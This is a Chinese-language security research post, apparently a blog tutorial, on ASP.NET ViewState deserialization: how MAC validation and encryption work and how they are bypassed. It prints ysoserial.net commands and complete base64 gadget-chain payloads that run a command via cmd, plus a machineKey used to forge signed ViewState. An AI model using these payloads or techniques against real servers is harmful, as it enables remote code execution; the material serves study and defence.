# 认识ViewState
使用vs2019创建一个新的项目

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/0aee8356-2131-0bf0-d570-048791462a1c.png)


![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/ccf2642e-7045-c424-ef11-c7a6f31a3087.png)

有一个默认的Default.aspx

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/4a29cc69-29c2-bffe-93fb-5a087ccfd507.png)

其中form表单有 `runat="server"` 属性，然后页面中生成了 `__VIEWSTATE` 和 `__VIEWSTATEGENERATOR` 两个隐藏字段。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/9be56a14-438a-b255-83c1-fab0c7f8e2e7.png)


使用[ViewStateDecoder](https://github.com/raise-isayan/ViewStateDecoder/tree/master/release)解密内容

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/b6a94d38-5f6c-8322-4206-ced686f21c93.png)

看过我之前文章的人应该知道这一串`/wEPDwULLTE2MTY2ODcyMjlkZPANhFrc/D/zynboI58b9RD9UhX7OF4/2ILmVw2Vu7d2`是由losFormatter序列化二进制数据然后base64的字符串

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/e6ce2593-f0f8-b94f-a503-3c754a0572c4.png)

反序列化回来可知其本质是一组`System.Web.UI.Pair`对象。我们可以在代码中向viewstate中添加键值来保存一些对象。

比如Default.aspx.cs

```
using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class _Default : System.Web.UI.Page 
{
    protected void Page_Load(object sender, EventArgs e)
    {
        ViewState.Add("asd", "asd");
    }
}
```
此时viewstate值为 `/wEPDwULLTE2MTY2ODcyMjkPFgIeA2FzZAUDYXNkZGRE3e84k6pb/oXbu/72ZxNc9h9dcEj+8FXmWEbtzuCtkQ==`

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/cc051b41-a1b5-f3a8-683f-c0b0f8b567f2.png)


也正是因为viewstate可以被任何人拿过来反序列化拿到其中的敏感信息，甚至可以直接传递恶意的viewstate进行反序列化rce(这个放后面演示)，所以losformatter被弃用而转由ObjectStateFormatter代替。ObjectStateFormatter的作用就在于对viewstate进行加密，并校验签名防篡改。


# viewstate的加密和防篡改

在dotnet2.0中，aspx的Page标签，或者web.config中都可以对viewstate进行加密，关键取决于以下两个值

1. ViewStateEncryptionMode="Always"
2. EnableViewStateMac="true"


ViewStateEncryptionMode是一个枚举，三个选项值就不解释了。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/1a681e8b-0c11-71d2-ea2a-887c66f3811f.png)

单独加密并不能解决篡改的问题，需要EnableViewStateMac来保证数据完整性。

当在aspx页面中启用`ViewStateEncryptionMode="Always"`时viewstate随之加密。


![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/39559b89-c987-70ac-1863-59c63d8be3f8.png)

而对于EnableViewStateMac

> 从.NET 4.5.2 开始，强制启用ViewStateMac功能，也就是说即使你将 EnableViewStateMac设置为false，也不能禁止ViewState的校验。安全公告KB2905247(于2014年9月星期二通过补丁程序发送到所有Windows计算机)将ASP.NET 设置为忽略EbableViewStateMac设置。

他的值取决于web.config中的一个键值和一个注册表的值，以及page自身的EnableViewStateMac。

在ObjectStateFormatter.Deserialize()中

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/ef32ebdf-e77e-086b-3672-5a6d6b9b2f0b.png)

array数组取决于是否启用EnableViewStateMac

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/0bde3a93-e391-8c43-c263-0b36f7fd2d23.png)


这个属性又取决于EnableViewStateMacRegistryHelper类，在他的构造函数中

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/89cbd7a4-430a-de01-1516-c4bd92f96a59.png)

断点的地方从注册表中读取一个值，如果为不等于0，则返回true

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/e4bdf13c-8d1a-a0b1-d759-4c294aa89ab0.png)

也就是不为0时，强制执行

```csharp
if (flag)
{
	EnableViewStateMacRegistryHelper.EnforceViewStateMac = true;
	EnableViewStateMacRegistryHelper.SuppressMacValidationErrorsFromCrossPagePostbacks = true;
}
```

将EnforceViewStateMac设置为true

另一个if条件是

```csharp
if (AppSettings.AllowInsecureDeserialization != null)
{
  EnableViewStateMacRegistryHelper.EnforceViewStateMac = !AppSettings.AllowInsecureDeserialization.Value;
  EnableViewStateMacRegistryHelper.SuppressMacValidationErrorsFromCrossPagePostbacks |= !AppSettings.AllowInsecureDeserialization.Value;
}
```

对AllowInsecureDeserialization取反，AllowInsecureDeserialization这个值在web.config中可以配置。

```xml
<configuration>
  <appSettings>
    <add key="aspnet:AllowInsecureDeserialization" value="true"/>
  </appSettings>
</configuration>
```

而只有这两个值最起码要启用一个才能强制关闭EnforceViewStateMac，比如下图。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/a0a01df3-2177-c626-1fec-5d3a472f7160.png)

虽然page里赋值为false，但是因为注册表中没有禁用mac，在web.config中也没禁用web.config，所以即使在page中禁用mac，通过反射输出的值仍为true，此时仍然是启用了mac校验的。

```csharp
            <%
                System.Reflection.PropertyInfo propertyInfo = Page.GetType().GetProperty("EnableViewStateMac", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
                object v = propertyInfo.GetValue(Page, new object[] { });
                Response.Write(propertyInfo.Name + ":" + v + "<br>");
                Response.Write(Environment.Version.ToString(3));
            %>
```

把注册表改为0，重启IIS，此时就能禁用mac验证了。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/4ae376b8-adcd-dd2e-5092-5faa746f4287.png)

# 禁用mac时的利用

当禁用mac时并且没有启用加密时，我们可以直接用LosFormatter生成payload打过去。

```
PS E:\code\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -f losformatter -g SessionViewStateHistoryItem -c "ping localhost -t"
/wEyqQsAAQAAAP////8BAAAAAAAAAAwCAAAAVFN5c3RlbS5XZWIuTW9iaWxlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYQUBAAAASVN5c3RlbS5XZWIuVUkuTW9iaWxlQ29udHJvbHMuU2Vzc2lvblZpZXdTdGF0ZStTZXNzaW9uVmlld1N0YXRlSGlzdG9yeUl0ZW0BAAAAAXMBAgAAAAYDAAAA3Akvd0V5bmdjQUFRQUFBUC8vLy84QkFBQUFBQUFBQUF3Q0FBQUFYazFwWTNKdmMyOW1kQzVRYjNkbGNsTm9aV3hzTGtWa2FYUnZjaXdnVm1WeWMybHZiajB6TGpBdU1DNHdMQ0JEZFd4MGRYSmxQVzVsZFhSeVlXd3NJRkIxWW14cFkwdGxlVlJ2YTJWdVBUTXhZbVl6T0RVMllXUXpOalJsTXpVRkFRQUFBRUpOYVdOeWIzTnZablF1Vm1semRXRnNVM1IxWkdsdkxsUmxlSFF1Um05eWJXRjBkR2x1Wnk1VVpYaDBSbTl5YldGMGRHbHVaMUoxYmxCeWIzQmxjblJwWlhNQkFBQUFEMFp2Y21WbmNtOTFibVJDY25WemFBRUNBQUFBQmdNQUFBREFCVHcvZUcxc0lIWmxjbk5wYjI0OUlqRXVNQ0lnWlc1amIyUnBibWM5SW5WMFppMHhOaUkvUGcwS1BFOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpQk5aWFJvYjJST1lXMWxQU0pUZEdGeWRDSWdTWE5KYm1sMGFXRnNURzloWkVWdVlXSnNaV1E5SWtaaGJITmxJaUI0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenB6WkQwaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMHVSR2xoWjI1dmMzUnBZM003WVhOelpXMWliSGs5VTNsemRHVnRJaUI0Yld4dWN6cDRQU0pvZEhSd09pOHZjMk5vWlcxaGN5NXRhV055YjNOdlpuUXVZMjl0TDNkcGJtWjRMekl3TURZdmVHRnRiQ0krRFFvZ0lEeFBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSXVUMkpxWldOMFNXNXpkR0Z1WTJVK0RRb2dJQ0FnUEhOa09sQnliMk5sYzNNK0RRb2dJQ0FnSUNBOGMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ0lDQWdJRHh6WkRwUWNtOWpaWE56VTNSaGNuUkpibVp2SUVGeVozVnRaVzUwY3owaUwyTWdjR2x1WnlCc2IyTmhiR2h2YzNRZ0xYUWlJRk4wWVc1a1lYSmtSWEp5YjNKRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGTjBZVzVrWVhKa1QzVjBjSFYwUlc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVmMyVnlUbUZ0WlQwaUlpQlFZWE56ZDI5eVpEMGllM2c2VG5Wc2JIMGlJRVJ2YldGcGJqMGlJaUJNYjJGa1ZYTmxjbEJ5YjJacGJHVTlJa1poYkhObElpQkdhV3hsVG1GdFpUMGlZMjFrSWlBdlBnMEtJQ0FnSUNBZ1BDOXpaRHBRY205alpYTnpMbE4wWVhKMFNXNW1iejROQ2lBZ0lDQThMM05rT2xCeWIyTmxjM00rRFFvZ0lEd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEkrQ3c9PQs=
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/fe4d2c16-1efe-c126-da7c-feaca212191e.png)

这里爆出了TextFormattingRunProperties的错误，说明执行了命令

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/bf59ea4f-80e4-8f3c-6516-b7543e5a40ac.png)


在传递__VIEWSTATE参数时发现是直接GET传参，其实POST传参也行，为什么直接传递参数就会被解析？是因为在Page中还有一个EnableViewState="false"的属性。

```csharp
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="_Default" EnableViewState="true" EnableViewStateMac="false" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <%
                System.Reflection.PropertyInfo propertyInfo = Page.GetType().GetProperty("EnableViewStateMac", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
                object v = propertyInfo.GetValue(Page, new object[] { });
                Response.Write(propertyInfo.Name + ":" + v + "<br>");
                Response.Write(Environment.Version.ToString(3));
                ViewState.Add("asd", "asd");
            %>
        </div>
    </form>
</body>
</html>
```

当 `EnableViewState="true"` 时，`__VIEWSTATE`为 `/wEPDwUKLTg0NTYxMzIxNQ8WAh4DYXNkBQNhc2RkZA==` 

false时，`__VIEWSTATE`为 `/wEPDwUKLTg0NTYxMzIxNWRk`。

区别在于禁用ViewState之后ViewState只是变短了而已，但是这个字段仍然存在，所以viewstate仍会被IIS被动解析。

Page类有一个RequestViewStateString属性

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/dc9ad425-45f7-bca2-9fd7-27e09321aba8.png)

从request中拿到`__VIEWSTATE`

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/b6b5b6a0-dd7d-d479-b187-7eb2799f270c.png)

在`System.Web.dll!System.Web.UI.HiddenFieldPageStatePersister.Load()`中获取`__VIEWSTATE`，交给objectstateformatter进行反序列化。所以请求中只要有`__VIEWSTATE`就会反序列化。

到这里我们清楚了，iis默认被动解析viewstate，如果禁用mac并且没有启用加密可以直接rce。但是实际环境都是默认启用mac校验，并且一般会启用加密，所以接下来看一下启用加密的viewstate怎么利用。

# 启用加密的利用
启用加密需要配置machineKey字段，page中`ViewStateEncryptionMode="Always"`时会自动生成machineKey。

[微软文档中](https://docs.microsoft.com/en-us/previous-versions/msp-n-p/ff649308(v=pandp.10)?redirectedfrom=MSDN)提到在web.config中可以配置如下来自动生成machineKey。web.config中默认就是这个，效果等同于不写。

```
<machineKey 
  validationKey="AutoGenerate,IsolateApps" 
  decryptionKey="AutoGenerate,IsolateApps" 
  validation="AES" 
  decryption="Auto" />
```

viewstate用于身份验证的情况下，每次都会根据machineKey的配置来加密解密。而每台机器生成的key都不一样，所以在大型应用比如sharepoint中会进行手动配置machineKey。而手动配置如果我们拿到了machineKey的值，就可以对其利用。

一个手动配置的例子如下

```xml
<machineKey validationKey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" decryptionKey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" validation="SHA1" decryption="AES"  />
```

用ysoserial.net生成

```
PS E:\code\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p viewstate -g TextFormattingRunProperties -c "ping localhost -t" --validationkey=70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0 --validationalg=SHA1 --islegacy

/wEyngcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADABTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgcGluZyBsb2NhbGhvc3QgLXQiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+C+yvvPy4DNhXXbZoH56OR6lLdT4o
```

将IIS的应用程序池设置为.net4.5，不然会报错找不到TextFormattingRunProperties的依赖

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/6e3ff083-e041-bacd-1956-d49a0843c9dd.png)

这边报错强制类型转换错误

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/bb16a818-de19-8c73-a308-1cd7455cbe84.png)

实际上是已经执行了cmd的

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/8ef07813-60a3-aa7d-513a-506a3a782943.png)


# __VIEWSTATEGENERATOR字段

大腿师傅问我`VIEWSTATEGENERATOR`字段对上的话，machineKey是不是一样。以及__VIEWSTATEGENERATOR是不是根据path和apppath生成的。

在objectstateformatter的反序列化方法中，启用加密会进入GetDecodedData解密viewstate

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/476ea7c8-bc14-8a28-dd69-e4b75773efab.png)

其参数有一个GetMacKeyModifier()方法的返回值

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/46cfaa8b-ef24-608d-2c9e-daa632e59ab3.png)

它返回一个字节数组，其中GetClientStateIdentifier来用TemplateSourceDirectory和classname计算hashcode

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/828eadb9-d594-d39e-911e-40241c3b40ea.png)

接着判断viewStateUserKey是否为空，如果不为空就使用_page.ViewStateUserKey，为空就用GetClientStateIdentifier()生成的。

也能用__VIEWSTATEGENERATOR字段，因为__VIEWSTATEGENERATOR字段就是用GetClientStateIdentifier计算的。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/09e5995e-ab32-c2b2-dac3-c10fb8622d5b.png)

回到大腿师傅的问题，我个人结论是__VIEWSTATEGENERATOR和machineKey没有关系。


本地实验两个不同的machineKey，__VIEWSTATEGENERATOR一致

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/383c3259-eb80-42c1-d358-7afe97bfbc04.png)

而当machineKey相同，文件名和类名不同时，__VIEWSTATEGENERATOR不一致

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/1572841/c45227a0-3f44-6ba7-54ea-35555406695f.png)

原因就是GetClientStateIdentifier生成__VIEWSTATEGENERATOR是依据TemplateSourceDirectory和classname，而并非machineKey。

另外ysoserial.net中viewstate插件有apppath和path参数，这两个参数就是用来计算VIEWSTATEGENERATOR的值，如果页面源代码里没有VIEWSTATEGENERATOR，可以使用这两个参数来计算。



# 参考
1. https://www.cnblogs.com/edisonchou/p/3901559.html
2. https://paper.seebug.org/1386/
3. https://github.com/0xacb/viewgen
